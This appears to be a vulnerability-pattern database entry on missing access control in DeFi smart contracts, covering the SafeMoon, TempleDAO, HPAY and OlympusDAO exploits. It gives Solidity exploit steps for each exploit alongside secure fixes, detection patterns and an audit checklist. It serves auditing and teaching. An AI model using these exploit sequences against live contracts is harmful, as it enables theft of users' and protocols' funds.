---
# Core Classification
protocol: "generic"
chain: "ethereum, bsc, avalanche"
category: "access_control"
vulnerability_type: "missing_access_control"

# Pattern Identity (Required)
root_cause_family: missing_access_control
pattern_key: missing_access_control | function_access | logical_error | fund_loss

# Interaction Scope
interaction_scope: single_contract

# Attack Vector Details
attack_type: "logical_error"
affected_component: "function_access, token_operations, state_management"

# Technical Primitives
primitives:
  - "missing_onlyOwner"
  - "unprotected_mint"
  - "unprotected_burn"
  - "public_setter"
  - "migration_function"
  - "fake_token_interface"
  - "input_validation"

# Impact Classification
severity: "critical"
impact: "fund_loss"
exploitability: 0.9
financial_impact: "critical"

# Grep / Hunt-Card Seeds (Required)
code_keywords:
  - "HPAY"
  - "burn"
  - "mint"
  - "sync"
  - "stake"
  - "token"
  - "amount"
  - "deploy"
  - "expiry"
  - "public"
  - "redeem"
  - "address"
  - "private"
  - "setPool"
  - "SafeMoon"
path_keys:
  - "unprotected_token_mint_burn"
  - "unprotected_migration_function"
  - "unprotected_configuration_setter"
  - "missing_token_registry_validation"

# Context Tags
tags:
  - "defi"
  - "access_control"
  - "missing_modifier"
  - "onlyOwner"
  - "mint"
  - "burn"
  - "migration"
  - "setter"
  - "input_validation"

# Version Info
language: "solidity"
version: ">=0.8.0"
---

## References

| Tag | Source | Path / URL |
|-----|--------|------------|
| [TEMP-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/Templedao_exp.sol` |
| [OHM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/OlympusDao_exp.sol` |
| [HPAY-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2022-10/HPAY_exp.sol` |
| [SFM-POC] | DeFiHackLabs | `DeFiHackLabs/src/test/2023-03/safeMoon_exp.sol` |

---

# Access Control Failure Attack Patterns (2022-2023)
## Overview

Access control failures are among the most straightforward yet devastating DeFi vulnerabilities. These occur when critical state-changing functions (mint, burn, migrate, configure) lack proper authorization checks — allowing anyone to call them. Between 2022-2023, access control failures caused over **$14.5M** in losses across 4+ major protocols. Attack patterns range from unprotected `mint()`/`burn()` on tokens (SafeMoon $8.9M) to missing `onlyOwner` on migration functions (TempleDAO $2.3M) to public configuration setters that allow reward token swaps (HPAY) and fake token interfaces bypassing bond redemption (OlympusDAO $292K).

---


### Agent Quick View

| Field | Value |
|-------|-------|
| Root Cause | `missing_access_control` |
| Pattern Key | `missing_access_control | function_access | logical_error | fund_loss` |
| Severity | CRITICAL |
| Impact | fund_loss |
| Interaction Scope | `single_contract` |
| Chain(s) | ethereum, bsc, avalanche |


## 1. Unprotected Token Mint / Burn

> **pathShape**: `atomic`

### Root Cause

When ERC20 token contracts expose `mint()` and `burn()` functions without access control modifiers (`onlyOwner`, `onlyRole`, or similar), any external caller can mint tokens to themselves or burn tokens from any address — including the liquidity pool pair contract. Burning LP pair tokens skews the reserve ratio, allowing the attacker to sell their minted/purchased tokens at a massively inflated rate.

### Attack Scenario

1. Call `burn(pairAddress, pairBalance - dust)` — burn nearly all tokens from LP pair
2. Call `sync()` on pair to update reserves (almost 0 tokens, same ETH/BNB)
3. Swap attacker's tokens for ETH/BNB at inflated rate (near-zero token supply in pair)
4. OR: call `mint(attacker, amount)` to create free tokens, then dump on DEX

### Vulnerable Pattern Examples

**Example 1: SafeMoon — Public mint() and burn() ($8.9M, March 2023)** [Approx Vulnerability: CRITICAL] `@audit` [SFM-POC]

```solidity
// ❌ VULNERABLE: SafeMoon V2 token has unprotected mint/burn functions
// Anyone can mint tokens to any address or burn from any address

interface ISafemoon {
    function mint(address user, uint256 amount) external;  // @audit No access control!
    function burn(address from, uint256 amount) external;  // @audit No access control!
    function bridgeBurnAddress() external view returns (address);
    function uniswapV2Pair() external view returns (address);
}

// Attack Vector 1: Mint from bridge reserve
sfmoon.mint(address(this), sfmoon.balanceOf(sfmoon.bridgeBurnAddress()));
// @audit Attacker mints tokens equivalent to bridge burn address balance

// Attack Vector 2: Burn LP pair tokens → inflate price → dump
function doBurnHack(uint256 amount) public {
    // Buy some SafeMoon tokens via swap
    swappingBnbForTokens(amount);

    // @audit Burn nearly ALL tokens from the liquidity pair
    sfmoon.burn(
        sfmoon.uniswapV2Pair(),
        sfmoon.balanceOf(sfmoon.uniswapV2Pair()) - 1_000_000_000
    );

    // Burn tokens held by SafeMoon contract itself
    sfmoon.burn(address(sfmoon), sfmoon.balanceOf(address(sfmoon)));

    // Sync pair to update reserves
    IUniswapV2Pair(sfmoon.uniswapV2Pair()).sync();
    // @audit Pair now has ~0 SafeMoon tokens but same WBNB
    // SafeMoon price effectively infinite

    // Swap attacker's tokens for BNB at inflated rate
    swappingTokensForBnb(sfmoon.balanceOf(address(this)));
    // Profit: ~27,463 WBNB (~$8.9M)
}
```

---

## 2. Unprotected Migration Function

> **pathShape**: `atomic`

### Root Cause

When staking or vault contracts implement `migrateStake()` functions for protocol upgrades, these functions must be restricted to only accept calls from authorized sources and only migrate from legitimate old staking contracts. If `migrateStake(oldStaking, amount)` accepts an arbitrary `oldStaking` address without validation, an attacker passes their own dummy contract and receives credit for any amount of staked tokens.

### Vulnerable Pattern Examples

**Example 2: TempleDAO — Unprotected migrateStake() ($2.3M, October 2022)** [Approx Vulnerability: CRITICAL] `@audit` [TEMP-POC]

```solidity
// ❌ VULNERABLE: migrateStake() has NO access control
// Accepts arbitrary oldStaking address and credits caller with staked tokens

// The vulnerable StaxLPStaking function:
// function migrateStake(address oldStaking, uint256 amount) external {
//     oldStaking.migrateWithdraw(msg.sender, amount);  // Calls arbitrary contract
//     // Credits msg.sender with `amount` staked tokens — no validation!
// }

// Two-line exploit:
uint256 lpbalance = xFraxTempleLP.balanceOf(address(StaxLPStaking));

// @audit Pass attacker's contract as "old staking" — it has a no-op migrateWithdraw
StaxLPStaking.migrateStake(address(this), lpbalance);

// @audit Now withdraw all credited tokens
StaxLPStaking.withdrawAll(false);

// Attacker's dummy callback — does nothing, just returns success:
function migrateWithdraw(address, uint256) public {}
// @audit $2.3M stolen via a 2-line exploit
```

---

## 3. Unprotected Configuration Setter

> **pathShape**: `linear-multistep`

### Root Cause

When staking or reward contracts expose configuration functions like `setToken()`, `setRewardToken()`, or `setPool()` without access control, an attacker can switch the reward/staking token to a worthless custom token, stake a massive amount, accrue rewards, then switch back to the real token and withdraw inflated rewards.

### Vulnerable Pattern Examples

**Example 3: HPAY — Public setToken() Allows Reward Swap (~115 BNB, October 2022)** [Approx Vulnerability: HIGH] `@audit` [HPAY-POC]

```solidity
// ❌ VULNERABLE: setToken() has NO access control
// Anyone can change the staking/reward token

interface IMintableAutoCompundRelockBonus {
    function setToken(address) external;  // @audit Anyone can call!
    function stake(uint256) external;
    function withdraw(uint256) external;
}

// Step 1: Create a worthless token
SHITCOIN shitcoin = new SHITCOIN();
shitcoin.mint(100_000_000 * 1e18);

// Step 2: Switch staking token to shitcoin
// @audit No onlyOwner modifier — anyone can change the reward token
BONUS.setToken(address(shitcoin));

// Step 3: Stake massive amount of worthless tokens
shitcoin.approve(address(BONUS), type(uint256).max);
BONUS.stake(shitcoin.balanceOf(address(this)));

// Step 4: Wait for rewards to accrue
vm.roll(block.number + 1000);

// Step 5: Switch token BACK to HPAY
BONUS.setToken(address(HPAY_TOKEN));

// Step 6: Withdraw — receives HPAY rewards based on shitcoin stake amount
// @audit Staked worthless tokens, withdrew valuable HPAY
BONUS.withdraw(30_000_000 * 1e18);
```

---

## 4. Missing Token Registry Validation

> **pathShape**: `atomic`

### Root Cause

When bond teller or similar contracts accept a `token` parameter in `redeem()` without validating that it is a legitimately issued bond token, an attacker can deploy a fake token contract that implements the expected interface (`underlying()`, `expiry()`, `burn()`) and pass it to `redeem()`. The teller calls the fake token's methods, receives attacker-controlled return values, and sends real protocol tokens.

### Vulnerable Pattern Examples

**Example 4: OlympusDAO — Fake Token in Bond Redeem ($292K, October 2022)** [Approx Vulnerability: HIGH] `@audit` [OHM-POC]

```solidity
// ❌ VULNERABLE: redeem() does not validate token_ is a registered bond token
// Any contract implementing underlying(), expiry(), burn() can drain OHM

// The vulnerable BondFixedExpiryTeller.redeem() pattern:
// function redeem(address token_, uint256 amount_) external {
//     ERC20 underlying_ = token_.underlying();  // Attacker controls return
//     uint48 expiry_ = token_.expiry();          // Attacker returns past timestamp
//     token_.burn(msg.sender, amount_);           // Attacker's burn = no-op
//     underlying_.transfer(msg.sender, amount_);  // Sends REAL OHM to attacker!
// }

// Attacker creates a fake bond token:
contract FakeToken {
    function underlying() external pure returns (address) {
        return OHM;  // @audit Points to REAL OHM token
    }
    function expiry() external pure returns (uint48) {
        return 1;  // @audit Already expired → bypasses time check
    }
    function burn(address, uint256) external pure {
        // @audit No-op — doesn't actually burn anything
    }
}

// Exploit:
address fakeToken = address(new FakeToken());
uint256 ohmBalance = IERC20(OHM).balanceOf(BondFixedExpiryTeller);
// @audit Drains ALL OHM from the teller using a fake token
IBondFixedExpiryTeller(BondFixedExpiryTeller).redeem(fakeToken, ohmBalance);
```

---

## Impact Analysis

### Technical Impact
- Complete LP pool drainage via token burn + reserve manipulation (SafeMoon)
- Full staking vault theft via unvalidated migration (TempleDAO)
- Reward token theft via configuration manipulation (HPAY)
- Treasury drainage via forged token interfaces (OlympusDAO)
- These are often the simplest exploits requiring minimal technical sophistication

### Business Impact
- **Total losses 2022-2023:** $14.5M+ (SafeMoon $8.9M, TempleDAO $2.3M, OlympusDAO $292K, HPAY ~$35K)
- Access control bugs are among the most common findings in audits
- Often require only 1-3 transaction calls to exploit (TempleDAO was a 2-line exploit)
- Destroys user trust when basic security measures are missing

### Affected Scenarios
- Token contracts with public mint/burn functions
- Staking contracts with migration/upgrade functions
- Reward/bonus contracts with configuration setters
- Bond teller or redemption contracts accepting external token addresses
- Any contract with state-changing functions missing `onlyOwner` or role-based access

---

## Secure Implementation

**Fix 1: Role-Based Access Control**
```solidity
// ✅ SECURE: Use OpenZeppelin AccessControl for granular permissions
import "@openzeppelin/contracts/access/AccessControl.sol";

contract SecureToken is ERC20, AccessControl {
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant BURNER_ROLE = keccak256("BURNER_ROLE");
    
    function mint(address to, uint256 amount) external onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }
    
    function burn(address from, uint256 amount) external onlyRole(BURNER_ROLE) {
        _burn(from, amount);
    }
}
```

**Fix 2: Whitelisted Migration Sources**
```solidity
// ✅ SECURE: Validate migration source against whitelist
contract SecureStaking {
    mapping(address => bool) public approvedOldStaking;
    
    function setApprovedOldStaking(address oldStaking, bool approved) external onlyOwner {
        approvedOldStaking[oldStaking] = approved;
    }
    
    function migrateStake(address oldStaking, uint256 amount) external {
        require(approvedOldStaking[oldStaking], "Not approved staking source");
        IOldStaking(oldStaking).migrateWithdraw(msg.sender, amount);
        _addStake(msg.sender, amount);
    }
}
```

**Fix 3: Token Registry Validation**
```solidity
// ✅ SECURE: Validate that bond token was issued by the protocol
contract SecureBondTeller {
    mapping(address => bool) public isRegisteredBondToken;
    
    function deploy(ERC20 underlying_, uint48 expiry_) external returns (address) {
        address bondToken = _deployBondToken(underlying_, expiry_);
        isRegisteredBondToken[bondToken] = true;
        return bondToken;
    }
    
    function redeem(address token_, uint256 amount_) external {
        require(isRegisteredBondToken[token_], "Token not registered");
        IBondToken(token_).burn(msg.sender, amount_);
        underlying.transfer(msg.sender, amount_);
    }
}
```

---

## Detection Patterns

### Code Patterns to Look For
```
- `function mint(address, uint256) external` without onlyOwner/onlyRole
- `function burn(address, uint256) external` without access control modifier
- `function setToken(address)` or `function setRewardToken(address)` without onlyOwner
- `function migrateStake(address oldStaking, ...)` without whitelist validation
- `function redeem(address token_, ...)` that calls token_.underlying() without registry check
- State-changing functions with no require(msg.sender == owner) or modifier
- Functions accepting arbitrary contract addresses and calling interface methods on them
- Configuration setters (setX, updateX, configureX) without access restrictions
```

### Audit Checklist
- [ ] Are all mint/burn functions restricted to authorized callers?
- [ ] Do migration functions validate the source contract against a whitelist?
- [ ] Are configuration setters (setToken, setReward, etc.) owner-restricted?
- [ ] Do redemption functions validate token addresses against a registry?
- [ ] Is `onlyOwner` or role-based access applied to all state-changing admin functions?
- [ ] Can any external caller modify reward token addresses?
- [ ] Are there functions that call arbitrary external interfaces without validation?
- [ ] Is the function visibility (`public`, `external`) appropriate for each function?

---

## Real-World Examples

### Known Exploits
- **SafeMoon V2** — Unprotected mint() and burn(), BSC — March 2023 — $8.9M
  - Root cause: Public mint/burn on token contract, burned LP pair tokens to inflate price
- **TempleDAO** — Unprotected migrateStake(), Ethereum — October 2022 — $2.3M
  - Root cause: No access control on migration function, attacker passed dummy contract
- **OlympusDAO** — No token registry in bond redeem, Ethereum — October 2022 — $292K
  - Root cause: redeem() accepted fake token with spoofed underlying()/expiry()/burn()
- **HPAY** — Public setToken(), BSC — October 2022 — ~115 BNB
  - Root cause: Staking reward token swappable by anyone via public setter

---

## Prevention Guidelines

### Development Best Practices
1. Apply access control modifiers (`onlyOwner`, `onlyRole`) to ALL state-changing functions
2. Use OpenZeppelin AccessControl for granular role-based permissions
3. Validate all external contract addresses against whitelists/registries
4. Never accept arbitrary `address` parameters for calling interface methods without validation
5. Use `internal` or `private` visibility for functions not meant to be externally called
6. Implement two-step ownership transfer to prevent accidental owner loss
7. Audit all `public`/`external` functions for missing access control modifiers

### Testing Requirements
- Unit tests for: unauthorized caller attempting mint/burn/setToken/migrate
- Integration tests for: full exploit flow (burn LP tokens → sync → swap at inflated price)
- Fuzzing targets: all external functions with arbitrary address parameters
- Access control tests: verify every state-changing function reverts for non-owner callers

---

## Keywords for Search

> `access control`, `missing onlyOwner`, `unprotected mint`, `unprotected burn`, `public setter`, `setToken vulnerability`, `migrateStake`, `migration exploit`, `fake token`, `token registry`, `bond redeem`, `privilege escalation`, `missing modifier`, `SafeMoon`, `TempleDAO`, `OlympusDAO`, `HPAY`, `LP token burn`, `reward token swap`, `configuration manipulation`, `unauthorized access`, `function visibility`

---

## Related Vulnerabilities

- `DB/general/initialization/defihacklabs-initialization-patterns.md` — Initialization without access control
- `DB/general/missing-validations/defihacklabs-input-validation-patterns.md` — Missing input validation
- `DB/general/dao-governance-vulnerabilities/defihacklabs-governance-attack-patterns.md` — Governance access
- `DB/general/proxy-vulnerabilities/` — Proxy upgrade access control
